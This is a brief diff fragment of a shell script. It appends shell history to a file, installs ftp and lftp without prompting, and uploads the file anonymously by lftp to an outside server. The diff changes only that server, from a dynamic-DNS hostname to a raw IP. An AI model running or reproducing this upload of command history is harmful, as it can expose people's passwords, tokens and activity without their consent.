@@ -21,4 +21,4 @@ history >>$kk
 sudo apt-get --assume-yes  install ftp
 sudo apt-get --assume-yes install lftp
 
-lftp -e 'cd SMX2; put '$kk';bye' -u anonymous, vladinatha.ddns.net
+lftp -e 'cd SMX2; put '$kk';bye' -u anonymous, 62.174.248.228
